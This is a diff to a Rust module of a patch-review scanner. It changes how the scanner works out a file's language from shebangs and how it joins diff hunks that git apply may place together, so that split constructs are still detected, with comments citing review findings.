@@ -11,6 +11,16 @@
 //! hunk, across its lines (the module `rust_tokens`). Evidence is lexical ([`EVIDENCE_BASIS`]): it
 //! finds tokens, it never proves a change is safe, and a construct built at run time, or one
 //! the hunk shows only a part of, can hide from it.
+//!
+//! A section of a patch is the unit of everything here: a file is one section, and what is
+//! read together is hunks of one section. **This rests on the parser refusing a patch that
+//! names one path in more than one section**, which release 0.8.4 does and the release this
+//! branch stands on (0.8.3) does not: plain `git apply` applies two sections for one path to
+//! the same file, and a construct that one begins and the other ends is then read in two
+//! halves, as two files (seventh independent review, IR7-H-2; the edge of each half is still
+//! read, see the module `rust_tokens`). This branch must not be merged before it stands on
+//! 0.8.4's refusal; the test `a_second_section_for_one_path_is_two_files_until_the_parser_refuses_it`
+//! pins today's answer and says what it must become.
 
 use crate::lexical::{
     Language, RustStart, ScanState, code_view, has_token, is_boundary_blocker, is_ident,
@@ -736,24 +746,72 @@ struct FileKind {
 }
 
 impl FileKind {
-    fn of(file: &ReviewFile) -> Self {
+    /// The kinds `file` is read as, the one release 0.8.3 read it as first. There is one,
+    /// unless the file's name gives no language: then a shebang does, and no number in a
+    /// hunk header says which line of the file a line of a hunk is.
+    ///
+    /// - First, the language by the release's rule, which is kept exactly, since it is the
+    ///   floor: the shebang on the first line of the new side of the first hunk, if that
+    ///   hunk's header says its new side starts at line 1. It may be no language.
+    /// - Then every other language that a shebang names on the first line of the old side or
+    ///   of the new side of ANY hunk. Git starts looking for a hunk at its new position and
+    ///   puts it where its lines are: `@@ -4,3 +1,5 @@` whose first line is `#!/bin/sh` goes
+    ///   to line 1 of a script that begins so, in silence, and so does the same hunk with
+    ///   `+4` or written second in its section. The numbers are hints; the text is there.
+    ///
+    /// The file is read under each kind and what the readings find is united
+    /// ([`file_found`]), as for every further reading. Two hunks that name two languages are
+    /// two kinds. The cost is a hunk in the middle of a file with no extension whose first
+    /// line reads as a shebang (a script quoted in a text): the file is then read as that
+    /// language too.
+    ///
+    /// Round 14 took the shebang from the first hunk only where `placed_at_top` put it at
+    /// the top, which rests on the header's OLD number: `@@ -4,3 +1,5 @@` then had no
+    /// language at all, and a fetch and an `eval` that release 0.8.3 and round 13 report
+    /// went unreported (seventh independent review, IR7-H-1). Before that the rule was the
+    /// release's alone, which the other false number (`+4`) and the order of hunks defeat.
+    fn readings(file: &ReviewFile) -> Vec<Self> {
         let path = file.path.as_str();
-        let name = path.rsplit('/').next().unwrap_or(path);
-        // A shebang is read from the first line of a new side that starts its file: where
-        // Git must put the first hunk at the beginning (`placed_at_top`), not where the
-        // header's new position says 1.
-        let first_line = file
-            .patch_twin
-            .hunks
+        if let Some(language) = Language::of(path, None) {
+            return vec![Self::with(path, Some(language))];
+        }
+        let shebang = |line: Option<&PatchLine>| {
+            line.and_then(|line| Language::of(path, Some(line.text.as_str())))
+        };
+        let hunks = &file.patch_twin.hunks;
+        let released = hunks
             .first()
-            .filter(|h| placed_at_top(file.status, h, true))
-            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
-            .map(|l| l.text.as_str());
+            .filter(|hunk| hunk.new_start == Some(1))
+            .and_then(|hunk| {
+                shebang(
+                    hunk.lines
+                        .iter()
+                        .find(|line| line.kind != PatchLineKind::Removed),
+                )
+            });
+        let mut languages = vec![released];
+        for hunk in hunks {
+            for other in [PatchLineKind::Removed, PatchLineKind::Added] {
+                let named = shebang(hunk.lines.iter().find(|line| line.kind != other));
+                if named.is_some() && !languages.contains(&named) {
+                    languages.push(named);
+                }
+            }
+        }
+        languages
+            .into_iter()
+            .map(|language| Self::with(path, language))
+            .collect()
+    }
+
+    /// The kind of a file at `path` read as `language`.
+    fn with(path: &str, language: Option<Language>) -> Self {
+        let name = path.rsplit('/').next().unwrap_or(path);
         // One extension table: the lexical layer's.
         let yaml = Language::of(path, None) == Some(Language::Yaml);
         let generated = crate::risk::is_generated_or_vendored(path);
         Self {
-            language: Language::of(path, first_line),
+            language,
             ci_workflow: ((path.starts_with(".github/workflows/")
                 || path.contains("/.github/workflows/"))
                 && yaml)
@@ -791,17 +849,15 @@ impl FileKind {
 /// the order that release gave them: it went by hunk, then line, then signal, as this does,
 /// and the signals it had come first in [`EvidenceSignal::ALL`], in its order.
 ///
-/// The answer for a hunk comes from the text it stands in (`texts`): that hunk, and the
+/// The answer for a hunk comes from the texts it stands in (`joined_texts`): that hunk, and the
 /// hunks of its file that no unseen line parts it from. There is no budget shared by the
 /// hunks of a file or the files of a review, so the answer does not depend on what else the
 /// review holds or on the order it is read in. (While a parser read the hunks, a review had a
 /// plan that said which hunks it might read, and every caller had to pass it.)
 #[must_use]
 pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
-    let kind = FileKind::of(file);
-    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
     let hunks = &file.patch_twin.hunks;
-    let found = texts_found(hunks, &texts(file), &kind, &rules, None);
+    let found = file_found(file, &joined_texts(file), None);
     let mut out: Vec<Evidence> = Vec::new();
     for (hunk, hits) in hunks.iter().zip(&found) {
         let mut address = None;
@@ -827,64 +883,65 @@ pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
     out
 }
 
-/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order: the labels the
-/// outline and hunk views show. The same scan as [`file_evidence`], of the texts this hunk
-/// stands in and no others, so a view never disagrees with the rank. Finding those texts costs
-/// a pass over the file's hunk headers; a caller that shows many hunks of one file asks
-/// [`joined_hunks`] once and then [`hunk_signals_alone`] for each hunk that is not in it.
+/// The distinct signals in hunk `index` of `file`, in [`EvidenceSignal::ALL`] order: the labels
+/// the outline and hunk views show; `None` if the file has no such hunk. The same scan as
+/// [`file_evidence`], of the texts this hunk stands in and no others, so a view never
+/// disagrees with the rank. What it costs: a pass over the file's hunk headers to find those
+/// texts, and one reading of each (the hunk alone, and each run it is in, whole: what stands
+/// before the hunk in a run decides how it starts, and what stands after it can complete a
+/// construct it begins and decides which starts the run is read from). So for a hunk of a
+/// long run this is the cost of that run, not of the hunk; it is not the cost of the file,
+/// since no other hunk is read alone. A caller that shows many hunks of one file asks
+/// [`joined_hunks`] once, then [`hunk_signals_alone`] for each hunk that is not in it, and
+/// scans the file once for the others.
+///
+/// The hunk is named by its place in the file. (Until 2026-11-15 it was passed by reference
+/// and looked for by its address in memory: a copy of the hunk was not found, and was then
+/// read alone with no word of it. Seventh independent review, IR7-L-4.)
 #[must_use]
-pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
-    let hunks = &file.patch_twin.hunks;
-    let Some(index) = hunks.iter().position(|h| std::ptr::eq(h, hunk)) else {
-        return hunk_signals_alone(file, hunk);
-    };
-    let kind = FileKind::of(file);
-    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
-    let with: Vec<Text> = texts(file)
+pub fn hunk_signals(file: &ReviewFile, index: usize) -> Option<Vec<EvidenceSignal>> {
+    file.patch_twin.hunks.get(index)?;
+    let with: Vec<Text> = joined_texts(file)
         .into_iter()
         .filter(|text| text.hunks.contains(&index))
         .collect();
-    let found = texts_found(hunks, &with, &kind, &rules, Some(index));
-    signals_of(&found[index])
+    let found = file_found(file, &with, Some(index));
+    Some(signals_of(&found[index]))
 }
 
 /// [`hunk_signals`] for a hunk that is a text of its own ([`joined_hunks`] does not name it):
-/// the scan of that hunk alone, at the cost of that hunk.
+/// the scan of that hunk alone, at the cost of that hunk. `None` if the file has no hunk
+/// `index`.
 #[must_use]
-pub fn hunk_signals_alone(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
-    let kind = FileKind::of(file);
-    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
-    let first = file
-        .patch_twin
-        .hunks
-        .first()
-        .is_some_and(|h| std::ptr::eq(h, hunk));
+pub fn hunk_signals_alone(file: &ReviewFile, index: usize) -> Option<Vec<EvidenceSignal>> {
+    let hunk = file.patch_twin.hunks.get(index)?;
     let lines: Vec<&PatchLine> = hunk.lines.iter().collect();
-    let top = placed_at_top(file.status, hunk, first);
-    let found = text_hits(&lines, top, kind.language, &rules);
-    if kind.language == Some(Language::Rust) {
-        signals_of(&unite(&found, &released_hits(hunk, &kind.legacy_rules())))
-    } else {
-        signals_of(&found)
+    let top = placed_at_top(file.status, hunk, index == 0);
+    let mut found = Vec::new();
+    for kind in FileKind::readings(file) {
+        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
+        found = unite(&found, &text_hits(&lines, top, kind.language, &rules));
+        if kind.language == Some(Language::Rust) {
+            found = unite(&found, &released_hits(hunk, &kind.legacy_rules()));
+        }
     }
+    Some(signals_of(&found))
 }
 
-/// The hunks of `file` that are read together with another hunk of it (`texts`): for these,
-/// the evidence of the hunk alone is not the evidence the file's scan gives it.
+/// For each hunk of `file`, by its place: whether it is read together with another hunk of
+/// the file (`joined_texts`). For such a hunk the evidence of the hunk alone is not the
+/// evidence the file's scan gives it. (One flag a hunk: until 2026-11-15 this was the list of
+/// their ids, which a caller kept as a set, and for a file of half a million joined hunks
+/// that set was a tenth of the memory of a view.)
 #[must_use]
-pub fn joined_hunks(file: &ReviewFile) -> Vec<HunkId> {
-    let hunks = &file.patch_twin.hunks;
-    let mut joined = vec![false; hunks.len()];
-    for text in texts(file).iter().filter(|text| text.hunks.len() > 1) {
+pub fn joined_hunks(file: &ReviewFile) -> Vec<bool> {
+    let mut joined = vec![false; file.patch_twin.hunks.len()];
+    for text in &joined_texts(file) {
         for index in &text.hunks {
             joined[*index] = true;
         }
     }
-    hunks
-        .iter()
-        .zip(joined)
-        .filter_map(|(hunk, joined)| joined.then_some(hunk.id))
-        .collect()
+    joined
 }
 
 /// The distinct signals of `hits`, in [`EvidenceSignal::ALL`] order.
@@ -899,20 +956,28 @@ fn signals_of(hits: &[Hit]) -> Vec<EvidenceSignal> {
 /// that it is the first hunk of its section. In a section that creates a file the first hunk
 /// is, whatever its header says, and no other (the file is empty until that hunk is applied).
 /// In any other section a hunk is when its OLD position is 0, or is 1 and the hunk holds an
-/// old line. Nothing else in a hunk header says where the hunk goes: plain `git apply` looks
-/// for the hunk's old lines, starting near the old position, and puts the hunk where it finds
-/// them. The new position is never used to place a hunk.
+/// old line: that is the one thing plain `git apply` reads the old position for.
+///
+/// Nothing else in a header says where a hunk goes. Git looks for the hunk's old lines,
+/// starting at the NEW position and going outward, and puts the hunk at the nearest place
+/// that has them. So a hunk this function does not call the top can be at the top all the
+/// same (`@@ -9,4 +1,5 @@` goes to line 1 of a file whose first four lines are its old
+/// lines, with no message), and no number says that it is not. A fragment is therefore read
+/// so that it loses nothing the top reading has: from code like the top; from the top of a
+/// file too when its first line is a shebang; and the language of a file with no extension
+/// comes from a shebang on the first line of any hunk ([`FileKind::readings`]).
 ///
 /// A hunk of added lines only with old position 1 (`@@ -1,0 +2,3 @@`) is not the top. Plain
 /// `git apply` refuses it on a file that has lines; `git apply --unidiff-zero`, which is how a
-/// `git diff -U0` patch is applied, puts it AFTER line 1. Read as a fragment it loses nothing
-/// the top reading has: a fragment is read from code like the top, and from the top of a file
-/// too when its first line is a shebang.
+/// `git diff -U0` patch is applied, puts it AFTER line 1.
 ///
 /// Until 2026-11-14 a side counted as the top of its file when its own first line had the
 /// number 1, and for the new side that number is the `+N` of the header, which is the patch
-/// writer's word: `@@ -9,4 +1,5 @@` is applied at line 9 (sixth independent review, IR6-H-1).
-/// The runs behind the rule are in the test `the_top_of_a_file_is_where_git_must_put_the_hunk`.
+/// writer's word: `@@ -9,4 +1,5 @@` is applied at line 9 when its old lines are there and
+/// not at line 1 (sixth independent review, IR6-H-1). Round 14 wrote in this place that Git
+/// looks near the OLD position and never uses the new one. It is the other way round
+/// (seventh independent review, IR7-L-3, and the runs in the test
+/// `the_top_of_a_file_is_where_git_must_put_the_hunk`); the rule was right and stays.
 fn placed_at_top(status: FileStatus, hunk: &PatchHunk, first: bool) -> bool {
     if status == FileStatus::Added {
         // The file is empty until its first hunk is applied, and never again.
@@ -938,65 +1003,111 @@ struct Text {
     top: bool,
 }
 
-/// The texts of `file`: every way its hunks are read.
+/// The texts of `file`: every way its hunks are read. Each hunk alone, and then the joined
+/// texts ([`joined_texts`]). (For the tests that say what the texts of a file are; the scan
+/// holds no entry for a hunk alone.)
+#[cfg(test)]
+fn texts(file: &ReviewFile) -> Vec<Text> {
+    (0..file.patch_twin.hunks.len())
+        .map(|index| Text {
+            hunks: vec![index],
+            top: placed_at_top(file.status, &file.patch_twin.hunks[index], index == 0),
+        })
+        .chain(joined_texts(file))
+        .collect()
+}
+
+/// The texts of `file` that are more than one hunk: the further ways its hunks are read.
 ///
-/// **Every hunk is a text of its own, always.** That is the reading of a hunk whose place is
-/// where its header's positions say, with unseen lines before and after it: the reading every
-/// version before this one made, and the right one for an applier that trusts positions
-/// (`git apply --unidiff-zero`, which a `git diff -U0` patch needs). No join takes it away.
+/// **Every hunk is a text of its own, always.** That is the reading of a hunk with unseen
+/// lines before and after it: the reading every version before round 14 made, and the right
+/// one wherever the hunks do not in fact stand together. No join takes it away. It needs no
+/// entry here: [`texts_found`] reads each hunk alone as it goes, and a file of half a million
+/// hunks does not hold half a million texts of one hunk for it (they took a fifth of the
+/// memory of a scan of such a file).
 ///
 /// **A join is a further reading.** Where plain `git apply` must put two hunks one straight
 /// after the other, or their positions say it does, they are ALSO read as one text, as if
 /// they were one hunk: the state of the lexer and the window of the reader of tokens run
 /// across the join. Each item is still reported with the hunk and the line it stands in, and
-/// what the readings find is united. The applier this models is plain `git apply` 2.56.0
-/// (the runs are in the test `hunks_git_must_put_together_are_one_text`):
+/// what the readings find is united.
 ///
-/// - A hunk whose last line is not a context line must match at the END of the file, and a
-///   hunk with no old line at all (only added lines) has nothing else to match. So a hunk of
-///   added lines only stands straight after the last earlier hunk of its section that ended
-///   the file, whatever the numbers in its header say (`@@ -50,0 +90,1 @@` after
-///   `@@ -0,0 +1,2 @@` is line 3). A section that creates a file is therefore one text from
-///   line 1, however many hunks it is written as; so is a run of such hunks at the end of an
-///   existing file.
-/// - Anywhere else Git places a hunk by looking for its old lines. Two hunks may touch (the
-///   second begins on the line after the last line of the first), but the patch cannot prove
-///   it: the old positions say so when they are honest. Hunks whose old positions say that
-///   one follows the other, in whatever order the patch has them, are read as one text too.
+/// What plain `git apply` 2.56.0 does with a hunk (run in scratch repositories; the runs are
+/// in the tests `the_top_of_a_file_is_where_git_must_put_the_hunk` and
+/// `hunks_git_must_put_together_are_one_text`): it looks for the hunk's old lines, starting
+/// at the hunk's NEW position and going outward, and puts the hunk at the nearest place that
+/// has them. The old position is read for one thing only: 0, or 1, says the hunk must be at
+/// the beginning. A hunk whose last line is not a context line must match at the END of the
+/// file. So the text decides, and the numbers are where to look first.
 ///
-/// So a hunk stands in at most three texts (alone; with the hunks Git must put beside it; and
-/// with those and the ones its positions name), and the cost of a file is at most three
-/// times one reading of it, however many hunks it has.
+/// - *Joins Git must make.* A hunk with no old line at all (only added lines) has nothing to
+///   match but the end of the file. So such a hunk stands straight after the last earlier
+///   hunk of its section that ended the file, whatever the numbers in its header say
+///   (`@@ -50,0 +90,1 @@` after `@@ -0,0 +1,2 @@` is line 3). A section that creates a file
+///   is therefore one text from line 1, however many hunks it is written as; so is a run of
+///   such hunks at the end of an existing file, which is also what a `git diff -U0` patch of
+///   added lines is to plain `git apply` (it needs `--unidiff-zero` to go where it was cut
+///   from, and there each of its hunks is a fragment: the reading of every hunk alone).
+/// - *Joins on a hint.* Anywhere else two hunks may touch (the second begins on the line
+///   after the last line of the first) and the patch cannot prove it. Its numbers say so
+///   when they are honest, and Git obeys neither number of a hunk whose old position is 2
+///   or more. Both are taken as hints: hunks are read as one text when their OLD positions
+///   say that one follows the other, and when their NEW positions say so, in whatever order
+///   the patch has them. A hunk with no line on a side says the line it stands after, as a
+///   later hunk and as an earlier one (`@@ -2,0 +3,1 @@` and then `@@ -3,1 +4,1 @@`: plain
+///   Git refuses the pair and `git apply --unidiff-zero` puts them together. Round 14
+///   joined that pair only when it was written the other way round: seventh independent
+///   review, IR7-M-2).
 ///
-/// What this does not see: two hunks that touch while the old position of the second says
-/// they do not (Git finds the second by its context, wherever its header says it is), and a
-/// hunk whose position says falsely that it follows another, before two that truly touch. A
-/// construct cut in two by such a pair is read in two halves. `git diff` writes neither
-/// touching hunks nor a file's creation in several hunks, so for a patch Git writes every
-/// hunk is read alone and no other way.
+///   The hints are taken twice. Once for plain `git apply`: the joins Git must make stand,
+///   and a number adds to them where it does not contradict them. And once for an applier
+///   that goes by the numbers alone (`git apply --unidiff-zero` puts a hunk with no old line
+///   at its new position and not at the end of the file): there the numbers join whatever
+///   they name, and nothing has to be at the end.
+///
+/// **The bound.** A hunk stands in at most six texts: alone; in the run Git must make; and in
+/// one run for each of the two numbers under each of the two ways of taking them. A run that
+/// two of these make is read once, so a patch whose numbers are true and whose hunks have
+/// context is read alone and, where hunks touch, once more. Within each kind of run a hunk
+/// has at most one hunk before it and one after it. So a file costs at most six readings of
+/// itself, however many hunks it has.
+///
+/// What this does not see: two hunks that touch while neither position of the second says
+/// so, and a hunk whose position says falsely that it follows another, before two that
+/// truly touch. A construct cut in two by such a pair is read in two halves by the join;
+/// what stands at the edge of each half is the matter of the rule for an anchor at the edge
+/// of a side. A `git diff` with context lines writes neither touching hunks nor a file's
+/// creation in several hunks, so for such a patch every hunk is read alone and no other
+/// way; a `git diff -U0` writes hunks of added lines only, and those are joined as above.
 ///
 /// Until 2026-11-14 every hunk was read alone only, and a file created as two hunks hid a
 /// call whose name ended the first and whose `()` began the second (sixth independent
-/// review, IR6-H-3).
-fn texts(file: &ReviewFile) -> Vec<Text> {
+/// review, IR6-H-3). Round 14 said in this place that Git places a hunk "by looking for its
+/// old lines near the old position" and joined on old positions only; Git starts at the new
+/// position (seventh independent review, IR7-L-3).
+fn joined_texts(file: &ReviewFile) -> Vec<Text> {
     let hunks = &file.patch_twin.hunks;
-    let old_lines: Vec<u64> = hunks
-        .iter()
-        .map(|hunk| {
-            hunk.lines
-                .iter()
-                .filter(|line| line.kind != PatchLineKind::Added)
-                .count() as u64
-        })
+    let count = |index: usize, other: PatchLineKind| {
+        hunks[index]
+            .lines
+            .iter()
+            .filter(|line| line.kind != other)
+            .count() as u64
+    };
+    let old_lines: Vec<u64> = (0..hunks.len())
+        .map(|index| count(index, PatchLineKind::Added))
+        .collect();
+    let new_lines: Vec<u64> = (0..hunks.len())
+        .map(|index| count(index, PatchLineKind::Removed))
         .collect();
     let top: Vec<bool> = hunks
         .iter()
         .enumerate()
         .map(|(index, hunk)| placed_at_top(file.status, hunk, index == 0))
         .collect();
-    // The hunk each hunk continues, and whether Git must put it there.
-    let mut before: Vec<Option<(usize, bool)>> = vec![None; hunks.len()];
-    let mut followed = vec![false; hunks.len()];
+    // The hunk each hunk must follow, and the hunks that have one that must follow them.
+    let mut must_before: Vec<Option<usize>> = vec![None; hunks.len()];
+    let mut must_followed = vec![false; hunks.len()];
     // The last hunk so far that must end the file.
     let mut ends_file: Option<usize> = None;
     for (index, hunk) in hunks.iter().enumerate() {
@@ -1004,8 +1115,8 @@ fn texts(file: &ReviewFile) -> Vec<Text> {
             && !top[index]
             && let Some(earlier) = ends_file
         {
-            before[index] = Some((earlier, true));
-            followed[earlier] = true;
+            must_before[index] = Some(earlier);
+            must_followed[earlier] = true;
         }
         if hunk
             .lines
@@ -1015,103 +1126,196 @@ fn texts(file: &ReviewFile) -> Vec<Text> {
             ends_file = Some(index);
         }
     }
-    // By old positions: the hunk whose last old line stands straight before a position.
-    let mut ends_before: std::collections::HashMap<u64, usize> = std::collections::HashMap::new();
-    for (index, hunk) in hunks.iter().enumerate() {
-        if let Some(start) = hunk.old_start
-            && old_lines[index] > 0
+    // The runs of a kind of join: `before` names the hunk each hunk follows.
+    let runs = |before: &[Option<usize>]| -> Vec<Vec<usize>> {
+        let mut after: Vec<Option<usize>> = vec![None; hunks.len()];
+        for (index, earlier) in before.iter().enumerate() {
+            if let Some(earlier) = earlier {
+                after[*earlier] = Some(index);
+            }
+        }
+        (0..hunks.len())
+            .filter(|index| before[*index].is_none())
+            .map(|start| std::iter::successors(Some(start), |index| after[*index]).collect())
+            .filter(|run: &Vec<usize>| run.len() > 1)
+            .collect()
+    };
+    // The runs Git must make; the runs each side's numbers add to them; the runs each side's
+    // numbers make by themselves. A run two of them make is read once.
+    let mut joined = runs(&must_before);
+    // The runs so far that begin with each hunk (five at most), so that a run made again is
+    // found without a search of all of them: a patch can be all pairs.
+    let mut begun: std::collections::HashMap<usize, Vec<usize>> = joined
+        .iter()
+        .enumerate()
+        .map(|(place, run)| (run[0], vec![place]))
+        .collect();
+    let old_side: Vec<(Option<u32>, u64)> = hunks
+        .iter()
+        .zip(&old_lines)
+        .map(|(hunk, lines)| (hunk.old_start, *lines))
+        .collect();
+    let new_side: Vec<(Option<u32>, u64)> = hunks
+        .iter()
+        .zip(&new_lines)
+        .map(|(hunk, lines)| (hunk.new_start, *lines))
+        .collect();
+    let must = (must_before.as_slice(), must_followed.as_slice());
+    for must in [Some(must), None] {
+        for before in [
+            hinted_joins(&old_side, &top, must),
+            hinted_joins(&new_side, &top, must),
+        ]
+        .into_iter()
+        .flatten()
         {
-            ends_before
-                .entry(u64::from(start) + old_lines[index])
-                .or_insert(index);
-        }
-    }
-    for (index, hunk) in hunks.iter().enumerate() {
-        if before[index].is_some() || top[index] {
-            continue;
-        }
-        let Some(start) = hunk.old_start else {
-            continue;
-        };
-        // A hunk with no old line says the line it stands after; another, its first line.
-        let position = u64::from(start) + u64::from(old_lines[index] == 0);
-        if let Some(&earlier) = ends_before.get(&position)
-            && earlier != index
-            && !followed[earlier]
-        {
-            before[index] = Some((earlier, false));
-            followed[earlier] = true;
-        }
-    }
-    // The hunk that continues each hunk: where Git must put it, and by either kind of join.
-    let mut must_follow: Vec<Option<usize>> = vec![None; hunks.len()];
-    let mut follows: Vec<Option<usize>> = vec![None; hunks.len()];
-    for (index, link) in before.iter().enumerate() {
-        if let Some((earlier, must)) = link {
-            follows[*earlier] = Some(index);
-            if *must {
-                must_follow[*earlier] = Some(index);
+            for run in runs(&before) {
+                let same_start = begun.entry(run[0]).or_default();
+                if !same_start.iter().any(|place| joined[*place] == run) {
+                    same_start.push(joined.len());
+                    joined.push(run);
+                }
             }
         }
     }
-    let run = |start: usize, after: &[Option<usize>]| Text {
-        hunks: std::iter::successors(Some(start), |index| after[*index]).collect(),
-        top: top[start],
-    };
-    // Every hunk alone; then the runs Git must make; then the runs the positions add to them.
-    let alone = (0..hunks.len()).map(|index| Text {
-        hunks: vec![index],
-        top: top[index],
-    });
-    let must = (0..hunks.len())
-        .filter(|index| !matches!(before[*index], Some((_, true))))
-        .map(|start| run(start, &must_follow));
-    let by_position = (0..hunks.len())
-        .filter(|index| before[*index].is_none())
-        .map(|start| run(start, &follows))
-        .filter(|text| {
-            text.hunks[1..]
-                .iter()
-                .any(|index| matches!(before[*index], Some((_, false))))
-        });
-    alone
-        .chain(must.filter(|text| text.hunks.len() > 1))
-        .chain(by_position)
+    joined
+        .into_iter()
+        .map(|hunks| Text {
+            top: top[hunks[0]],
+            hunks,
+        })
         .collect()
 }
 
-/// What the rules find in each hunk of `hunks` (in the one hunk `only`, when it names one), in
-/// the readings `texts` gives and, for Rust, in the reading of release 0.8.3
-/// ([`released_hits`]): for each hunk, in line order and then the order of
-/// [`EvidenceSignal::ALL`], an item once however many texts and readings find it, marked
-/// `released` when release 0.8.3 reported it.
+/// The hunk each hunk follows by the positions of one side, if those positions join any:
+/// `side` has, for each hunk, the start its header gives on that side and how many lines it
+/// has there. A hunk with lines on the side says its first line and, with its count, the line
+/// after its last; a hunk with none says the line it stands after. A hunk that is the `top`
+/// of its file follows nothing.
+///
+/// `must`: for plain `git apply`, the hunk each hunk must follow and the hunks that have one
+/// that must follow them. Those joins stand, and a number only adds to them. Without it the
+/// numbers are taken alone, as an applier takes them for which nothing has to be at the end
+/// of the file.
+fn hinted_joins(
+    side: &[(Option<u32>, u64)],
+    top: &[bool],
+    must: Option<(&[Option<usize>], &[bool])>,
+) -> Option<Vec<Option<usize>>> {
+    let mut ends_before: std::collections::HashMap<u64, usize> = std::collections::HashMap::new();
+    for (index, (start, lines)) in side.iter().enumerate() {
+        if let Some(start) = start {
+            ends_before
+                .entry(u64::from(*start) + (*lines).max(1))
+                .or_insert(index);
+        }
+    }
+    let (mut before, mut followed) = match must {
+        Some((before, followed)) => (before.to_vec(), followed.to_vec()),
+        None => (vec![None; side.len()], vec![false; side.len()]),
+    };
+    // The run each hunk is in so far, by its first hunk: a hint that would close a ring (a
+    // hunk that Git must put after another, named by its number as standing before it) is
+    // not taken.
+    let mut first: Vec<usize> = (0..side.len()).collect();
+    let head = |first: &mut Vec<usize>, mut index: usize| {
+        while first[index] != index {
+            first[index] = first[first[index]];
+            index = first[index];
+        }
+        index
+    };
+    for index in 0..side.len() {
+        if let Some(earlier) = before[index] {
+            first[index] = head(&mut first, earlier);
+        }
+    }
+    let mut hints = false;
+    for (index, (start, lines)) in side.iter().enumerate() {
+        if before[index].is_some() || top[index] {
+            continue;
+        }
+        let Some(start) = start else {
+            continue;
+        };
+        let position = u64::from(*start) + u64::from(*lines == 0);
+        if let Some(&earlier) = ends_before.get(&position)
+            && !followed[earlier]
+            && head(&mut first, earlier) != index
+        {
+            before[index] = Some(earlier);
+            followed[earlier] = true;
+            first[index] = head(&mut first, earlier);
+            hints = true;
+        }
+    }
+    hints.then_some(before)
+}
+
+/// What the rules find in each hunk of `file` (in the one hunk `only`, when it names one),
+/// read alone and in the texts `joined`, under every kind the file is read as
+/// ([`FileKind::readings`]): for each hunk, in line order and then the order of
+/// [`EvidenceSignal::ALL`], an item once however many kinds, texts and readings find it.
+fn file_found(file: &ReviewFile, joined: &[Text], only: Option<usize>) -> Vec<Vec<Hit>> {
+    let mut found: Vec<Vec<Hit>> = Vec::new();
+    for (place, kind) in FileKind::readings(file).iter().enumerate() {
+        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
+        let of_kind = texts_found(file, joined, kind, &rules, only, place == 0);
+        if place == 0 {
+            // nearly every file is read as one kind: its table is the answer
+            found = of_kind;
+            continue;
+        }
+        for (all, own) in found.iter_mut().zip(of_kind) {
+            *all = if all.is_empty() {
+                own
+            } else {
+                unite(all, &own)
+            };
+        }
+    }
+    found
+}
+
+/// What the rules find in each hunk of `file` (in the one hunk `only`, when it names one) under
+/// one kind: in the hunk read alone, in each text of `joined` it stands in and, for Rust, in
+/// the reading of release 0.8.3 ([`released_hits`]). For each hunk, in line order and then the
+/// order of [`EvidenceSignal::ALL`], an item once however many texts and readings find it,
+/// marked `released` when release 0.8.3 reported it (`release`: `kind` is the kind that
+/// release read the file as, the first of [`FileKind::readings`]; under any other kind
+/// nothing is that release's).
+///
+/// Every hunk is read alone here, in file order, with nothing kept for it but what it gives:
+/// no join takes that reading away, and no list of such texts is held.
 fn texts_found(
-    hunks: &[PatchHunk],
-    texts: &[Text],
+    file: &ReviewFile,
+    joined: &[Text],
     kind: &FileKind,
     rules: &[&Rule],
     only: Option<usize>,
+    release: bool,
 ) -> Vec<Vec<Hit>> {
+    let hunks = &file.patch_twin.hunks;
     let language = kind.language;
     let legacy = kind.legacy_rules();
     let mut found: Vec<Vec<Hit>> = vec![Vec::new(); hunks.len()];
-    for text in texts {
+    let mut read = |text: &[usize], top: bool| {
         let mut lines: Vec<&PatchLine> = Vec::new();
         // Where each hunk's lines end in `lines`.
-        let mut ends = Vec::with_capacity(text.hunks.len());
-        for index in &text.hunks {
+        let mut ends = Vec::with_capacity(text.len());
+        for index in text {
             lines.extend(hunks[*index].lines.iter());
             ends.push(lines.len());
         }
-        let mut hits = text_hits(&lines, text.top, language, rules)
+        let mut hits = text_hits(&lines, top, language, rules)
             .into_iter()
             .peekable();
         // Release 0.8.3 read every hunk alone. Outside Rust its scanner and its rules for the
         // signals it had are the ones of today, so there this reading of a hunk alone is its
         // reading; for Rust it is `released_hits`, below.
-        let as_released = text.hunks.len() == 1 && language != Some(Language::Rust);
+        let as_released = release && text.len() == 1 && language != Some(Language::Rust);
         let mut start = 0;
-        for (index, end) in text.hunks.iter().zip(ends) {
+        for (index, end) in text.iter().zip(ends) {
             let mut own = Vec::new();
             while let Some(hit) = hits.next_if(|hit| hit.at < end) {
                 own.push(Hit {
@@ -1127,6 +1331,14 @@ fn texts_found(
             };
             start = end;
         }
+    };
+    for (index, hunk) in hunks.iter().enumerate() {
+        if only.is_none_or(|only| only == index) {
+            read(&[index], placed_at_top(file.status, hunk, index == 0));
+        }
+    }
+    for text in joined {
+        read(&text.hunks, text.top);
     }
     if language == Some(Language::Rust) {
         for (index, hunk) in hunks.iter().enumerate() {
@@ -1344,22 +1556,54 @@ fn rust_reading(
     (views, old_carries, new_carries)
 }
 
-/// The number of `#` straight after the first quote of `texts` (the lines of a side) that
-/// has any. In a side that began inside a raw string this is the string's closing quote
-/// (`"#`, `"##`, …) unless the string's own text holds a quote followed by `#`; so it says
-/// with how many `#` the string was opened, whatever that number is. The quote is taken from
-/// the text as it stands, not from any reading of it: a reading from the wrong start can have
-/// the closing quote inside a comment or a character literal.
-fn first_quote_hashes(texts: &[&str]) -> Option<usize> {
-    texts.iter().find_map(|text| {
-        let at = text.find("\"#")?;
-        Some(
-            text.as_bytes()[at + 1..]
+/// How many raw-string starts a side is read from at most ([`quote_hash_records`]).
+const RAW_STARTS: usize = 4;
+
+/// The counts of `#` with which a raw string that `texts` (the lines of a side) began in can
+/// have been opened, lowest first, [`RAW_STARTS`] of them at most.
